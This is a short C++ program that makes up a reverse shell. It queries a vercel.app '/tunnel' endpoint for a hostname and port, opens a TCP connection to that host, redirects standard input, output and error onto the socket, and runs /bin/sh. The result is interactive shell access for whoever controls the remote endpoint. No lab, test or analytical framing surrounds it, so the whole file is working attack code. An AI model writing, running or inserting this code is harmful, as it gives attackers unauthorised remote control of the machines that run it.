#include <iostream>
#include <string>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

using json = nlohmann::json;

// Callback for curl to write response into a string
size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string *)userp)->append((char *)contents, size * nmemb);
    return size * nmemb;
}

int main()
{
    std::string url = "https://my-api-wine-iota.vercel.app/tunnel";
    std::string readBuffer;

    CURL *curl = curl_easy_init();
    if (curl)
    {

        // curl_easy_setopt is a C function used to configure options for a CURL easy handle. It allows setting various parameters, such as URLs, timeouts, and authentication details, to customize the behavior of a CURL session.
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());             // Set the URL to fetch.
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback); // Specify the callback function to handle incoming data.
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);       // Pass a pointer to the object that will store the response (readBuffer).
        CURLcode res = curl_easy_perform(curl);                       // Performs the HTTP request synchronously.
        if (res != CURLE_OK)
        {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << "\n";
            return 1;
        }
        curl_easy_cleanup(curl);
    }
    json j = json::parse(readBuffer);
    std::string hostname = j["hostname"];
    int port = j["port"];
    std::string port_str = std::to_string(port); // <-- fix

    std::cout << "Hostname: " << hostname << "\n";
    std::cout << "Port: " << port << "\n";

    struct addrinfo hints, *res;
    int sockfd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int status = getaddrinfo(hostname.c_str(), port_str.c_str(), &hints, &res);
    if (status != 0)
    {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return 1;
    }

    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sockfd == -1)
    {
        perror("socket");
        freeaddrinfo(res);
        return 1;
    }

    if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1)
    {
        perror("connect");
        close(sockfd);
        freeaddrinfo(res);
        return 1;
    }

    printf("Connected to %s:%s\n", hostname.c_str(), port_str.c_str());

    // Redirect stdin, stdout, stderr
    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }

    // Execute shell
    execve("/bin/sh", NULL, NULL);

    return 0;
}
